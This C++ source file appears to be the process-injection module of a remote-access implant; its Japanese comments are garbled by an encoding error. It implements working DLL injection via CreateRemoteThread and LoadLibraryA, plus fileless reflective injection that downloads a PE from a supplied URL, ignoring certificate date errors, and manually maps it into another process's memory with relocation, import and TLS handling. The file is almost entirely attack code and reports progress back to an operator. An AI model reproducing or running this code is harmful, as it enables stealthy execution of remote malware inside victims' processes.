// �v���Z�X�C���W�F�N�V�����̃R�}���h
#include "ProcessInjection.h"





// �m�[�}����DLL�C���W�F�N�V����
void DllInjection(std::vector<std::string>& tokens) {
    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr = 
            "�g�p���@: injectdll <�v���Z�XID> <DLL�p�X>" + newline +
            "�����[�g�v���Z�X��DLL�����[�h���܂�";

        SendString(helpStr);
        return;
    }

    if (tokens.size() < 3) {
        SendString("�g�p���@: dllinject <�v���Z�XID> <DLL�p�X>");
        return;
    }

    // ��������v���Z�XID��DLL�̃p�X���擾
    DWORD processId = std::stoi(tokens[1]);
    std::string dllPath = tokens[2];

    // DLL�p�X���_�u���N�H�[�e�[�V�����ň͂܂�Ă���ꍇ�g���~���O
    if (dllPath.front() == '\"' && dllPath.back() == '\"') {
        dllPath = dllPath.substr(1, dllPath.size() - 2);
    }

    // ���΃p�X���΃p�X�ɕϊ�
    std::filesystem::path absolutePath = std::filesystem::absolute(dllPath);

    // DLL�̑��݂��m�F
    if (!std::filesystem::exists(absolutePath)) {
        SendString("[-] DLL�����݂��܂���: " + absolutePath.string());
        return;
    }

    // DLL�p�X�T�C�Y���v�Z
    SIZE_T dllPathSize = (absolutePath.string().size() + 1) * sizeof(char); // char�T�C�Y�ɏC��

    // �v���Z�X���J��
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == nullptr) {
        SendString("[-] �v���Z�X���J���܂���ł���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] �v���Z�X�n���h���擾");

    // DLL�p�X�T�C�Y���̃������̈���m�ۂ���
    LPVOID dllPathMemory = VirtualAllocEx(processHandle, nullptr, dllPathSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathMemory == nullptr) {
        SendString("[-] �^�[�Q�b�g�v���Z�X���Ƀ����������蓖�Ă��܂���ł���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] �����[�g�v���Z�X�Ƀ��������蓖��");

    // DLL�̃p�X����������
    if (!WriteProcessMemory(processHandle, dllPathMemory, absolutePath.string().c_str(), dllPathSize, nullptr)) {
        SendString("[-] DLL�p�X�̏������݂��ł��܂���ł���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] DLL�p�X�̏�������");

    // �����[�g�X���b�h���쐬����
    HANDLE threadHandle = CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), dllPathMemory, 0, nullptr);
    if (threadHandle == nullptr) {
        SendString("[-] �����[�g�X���b�h���쐬�ł��܂���ł���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] �����[�g�X���b�h�̍쐬");

    SendString("[+] DLL�C���W�F�N�V��������");
}


// �t�@�C�����X���ˌ^DLL�C���W�F�N�V����
void FilelessReflectiveDLLInjection(std::vector<std::string>& tokens) {
    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "[+] �g�p���@: frefinject <�v���Z�XID> <PE��URL>\n"
            "[+] �����[�g�v���Z�X��PE�𔽎ˌ^���[�h���܂�";

        SendString(helpStr);
        return;
    }

    if (tokens.size() < 3) {
        SendString("[-] �g�p���@: frefinject <�v���Z�XID> <PE��URL>");
        return;
    }

    // ��������v���Z�XID��DLL�̃p�X���擾
    DWORD processId = std::stoi(tokens[1]);
    std::string urlPath = tokens[2];

    std::vector<BYTE> shellcode;
    bool isStage = StagingPayloadViaHttp(urlPath, shellcode);
    if (!isStage) {
        SendString("[-] �y�C���[�h�̃X�e�[�W���O�Ɏ��s");
        return;
    }
    SendString("[+] �y�C���[�h�̃X�e�[�W");

    PBYTE downloadPayload = reinterpret_cast<PBYTE>(shellcode.data());

    // �v���Z�X���J��
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == nullptr) {
        SendString("[-] �v���Z�X���J���܂���ł���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] �v���Z�X�n���h���̎擾");

    // �ePE�w�b�_�̐擪�A�h���X���擾
    PIMAGE_DOS_HEADER pOldDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(downloadPayload);
    PIMAGE_NT_HEADERS pOldNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(downloadPayload + reinterpret_cast<PIMAGE_DOS_HEADER>(downloadPayload)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOldOptionalHeader = &pOldNtHeader->OptionalHeader;
    PIMAGE_FILE_HEADER pOldFileHeader = &pOldNtHeader->FileHeader;
    SendString("[+] PE�w�b�_�[���̎擾");

    // SizeOfImage���̃��������m��
    PBYTE pBase = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, pOldOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!pBase) {
        SendString("[-] �������m�ۂɎ��s���܂���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] �������̊m��");

    // ���ˌ^���[�_�[�̈������i�[
    MANUAL_MAPPING_DATA data{};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
    data.pbase = pBase;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.reservedParam = 0;

    // �w�b�_�[���R�s�[
    if (!WriteProcessMemory(processHandle, pBase, downloadPayload, pOldOptionalHeader->SizeOfHeaders, nullptr)) {
        SendString("[-] �w�b�_�[�̃R�s�[�Ɏ��s���܂���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] �w�b�_�[�̃R�s�[");

    // �Z�N�V�������R�s�[
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
    for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
        if (pSectionHeader->SizeOfRawData) {
            if (!WriteProcessMemory(processHandle, pBase + pSectionHeader->VirtualAddress, downloadPayload + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, nullptr)) {
                SendString("[-] �Z�N�V���� " + std::to_string(i) + " �̃R�s�[�Ɏ��s���܂���: " + std::to_string(GetLastError()));
                return;
            }
            SendString("[+] �Z�N�V���� " + std::to_string(i) + " �̃R�s�[");
        }
    }

    // ���ˌ^���[�_�[����������
    PBYTE pReflectiveLoader = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!pReflectiveLoader || !WriteProcessMemory(processHandle, pReflectiveLoader, ReflectiveLoader, 0x1000, nullptr)) {
        SendString("[-] ���ˌ^���[�_�[�̏������݂Ɏ��s���܂���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] ���ˌ^���[�_�[�̏�������");

    // ���ˌ^���[�_�[�̈�������������
    LPVOID pReflectiveLoaderArg = VirtualAllocEx(processHandle, nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pReflectiveLoaderArg || !WriteProcessMemory(processHandle, pReflectiveLoaderArg, &data, sizeof(MANUAL_MAPPING_DATA), nullptr)) {
        SendString("[-] ���ˌ^���[�_�[�����̏������݂Ɏ��s���܂���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] ���ˌ^���[�_�[�̈�������������");

    // �����[�g�X���b�h���쐬���Ĕ��ˌ^���[�_�[���N��
    if (!CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pReflectiveLoader), pReflectiveLoaderArg, 0, nullptr)) {
        SendString("[-] �����[�g�X���b�h�̍쐬�Ɏ��s���܂���: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] �����[�g�X���b�h�̍쐬");
}


// ���ˌ^���[�_�[�֐�
void __stdcall ReflectiveLoader(MANUAL_MAPPING_DATA* pData) {
    PBYTE baseAddress = pData->pbase;

    // PE�w�b�_�̐擪�A�h���X���擾
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(baseAddress);
    PIMAGE_NT_HEADERS pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(baseAddress + reinterpret_cast<PIMAGE_DOS_HEADER>(pDosHeader)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;

    // �֐��|�C���^�ϐ����`
    f_LoadLibraryA _LoadLibraryA = pData->pLoadLibraryA;
    f_GetProcAddress _GetProcAddress = pData->pGetProcAddress;
    f_DLL_ENTRY_POINT _DllMain = reinterpret_cast<f_DLL_ENTRY_POINT>(baseAddress + pOptionalHeader->AddressOfEntryPoint);

    // �x�[�X�Ĕz�u
    PBYTE locationDelta = baseAddress - pOptionalHeader->ImageBase;
    if (locationDelta) {
        if (!pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) return;

        PIMAGE_BASE_RELOCATION pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        PIMAGE_BASE_RELOCATION pRelocEnd = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uintptr_t>(pRelocData) + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

        while (pRelocData < pRelocEnd && pRelocData->SizeOfBlock) {
            UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD pRelativeInfo = reinterpret_cast<PWORD>(pRelocData + 1);

            for (UINT i = 0; i != AmountOfEntries; ++i, ++pRelativeInfo) {
                if ((*pRelativeInfo >> 0x0C) == IMAGE_REL_BASED_DIR64) {
                    PUINT_PTR pPatch = reinterpret_cast<PUINT_PTR>(baseAddress + pRelocData->VirtualAddress + ((*pRelativeInfo) & 0xFFF));
                    *pPatch += reinterpret_cast<UINT_PTR>(locationDelta);
                }
            }
            pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<PBYTE>(pRelocData) + pRelocData->SizeOfBlock);
        }
    }

    // IAT����
    if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (pImportDescriptor->Name) {
            LPCSTR szMod = reinterpret_cast<LPCSTR>(baseAddress + pImportDescriptor->Name);
            HINSTANCE hDll = _LoadLibraryA(szMod);
            PULONG_PTR pThunkRef = reinterpret_cast<PULONG_PTR>(baseAddress + pImportDescriptor->OriginalFirstThunk);
            PULONG_PTR pFuncRef = reinterpret_cast<PULONG_PTR>(baseAddress + pImportDescriptor->FirstThunk);

            if (!pThunkRef) pThunkRef = pFuncRef;

            for (; *pThunkRef; ++pThunkRef, ++pFuncRef) {
                if (IMAGE_SNAP_BY_ORDINAL(*pThunkRef)) {
                    *pFuncRef = reinterpret_cast<ULONG_PTR>(_GetProcAddress(hDll, reinterpret_cast<char*>(*pThunkRef & 0xFFFF)));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pImport = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(baseAddress + (*pThunkRef));
                    *pFuncRef = reinterpret_cast<ULONG_PTR>(_GetProcAddress(hDll, pImport->Name));
                }
            }
            ++pImportDescriptor;
        }
    }

    // TLS�R�[���o�b�N������ΌĂяo��
    if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
        PIMAGE_TLS_DIRECTORY pTLS = reinterpret_cast<IMAGE_TLS_DIRECTORY*>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        PIMAGE_TLS_CALLBACK* pCallback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(pTLS->AddressOfCallBacks);
        for (; pCallback && *pCallback; ++pCallback)
            (*pCallback)(baseAddress, DLL_PROCESS_ATTACH, nullptr);
    }

    // �G���g���|�C���g�Ăяo��
    _DllMain(baseAddress, pData->fdwReasonParam, pData->reservedParam);
}

// �t�@�C���T�[�o�[����y�C���[�h���X�e�[�W���O
bool StagingPayloadViaHttp(const std::string& url, std::vector<BYTE>& shellcode) {
    // �����l�ݒ�
    HINTERNET internetHandle = InternetOpen(L"Payload Stager", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!internetHandle) {
        return false;
    }

    // URL���J��
    HINTERNET urlHandle = InternetOpenUrlA(internetHandle, url.c_str(), nullptr, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!urlHandle) {
        InternetCloseHandle(internetHandle);
        return false;
    }

    DWORD bytesRead;
    BYTE buffer[1024];

    // �V�F���R�[�h��ǂݍ��ރ��[�v
    while (true) {
        // URL����f�[�^��ǂݍ���
        if (!InternetReadFile(urlHandle, buffer, sizeof(buffer), &bytesRead) || bytesRead == 0) {
            break;
        }

        // �ǂݍ��񂾃f�[�^���x�N�^�[�ɒǉ�
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    // ���\�[�X�����
    InternetCloseHandle(urlHandle);
    InternetCloseHandle(internetHandle);

    return !shellcode.empty();
}
